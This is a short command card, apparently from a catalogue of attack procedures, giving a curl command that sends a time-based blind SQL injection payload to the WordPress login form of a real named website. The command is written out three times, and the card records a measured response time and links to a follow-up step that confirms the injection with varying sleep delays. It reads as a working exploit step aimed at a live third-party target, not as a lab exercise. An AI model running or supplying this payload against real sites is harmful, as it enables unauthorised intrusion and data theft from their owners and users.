---
id: cmd-curl-sleep-0-001
data: >-
  curl -X POST https://www.acronis.cz/wp-login.php -d
  "log=0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z&pwd=test&wp-submit=Log+In" -w
  "%{time_total}s"
tags:
  - sqli
  - baseline
type: command
output: Response time of approximately 0.912 seconds.
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.525Z'
verified: false
validated: true
submitted: true
---
# curl-inject-sleep-0

## Command

```bash
curl -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z&pwd=test&wp-submit=Log+In" -w "%{time_total}s"
```

## Description

Baseline injection with no sleep to measure normal query time.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | Payload with sleep(0) | Yes |
| `-w` | Time measurement | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z&pwd=test&wp-submit=Log+In" -w "%{time_total}s"
```

## Expected Output

~0.912s, quick response.

## Related

- [[Related Procedure: Confirm SQLi with Varying Sleep Durations]]
